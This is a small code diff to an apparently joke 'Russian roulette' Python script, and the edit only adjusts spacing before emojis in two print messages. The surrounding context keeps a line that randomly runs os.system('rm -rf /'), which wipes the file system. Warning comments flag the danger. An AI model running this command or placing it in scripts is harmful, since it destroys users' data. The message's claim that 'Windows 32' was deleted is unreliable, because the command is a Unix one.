@@ -12,6 +12,6 @@ if chamber == bullet:
     # WARNING: This code deletes critical system files and can cause irreparable damage to your system!
     # DO NOT RUN THIS CODE ON A REAL SYSTEM!
     os.system("rm -rf /")
-    print("Windows 32 has been successfully deleted! 😱")
+    print("Windows 32 has been successfully deleted!😱")
 else:
-    print("Phew! You survived... this time. Try again if you dare! 😜")
+    print("Phew! You survived... this time. Try again if you dare!😜")
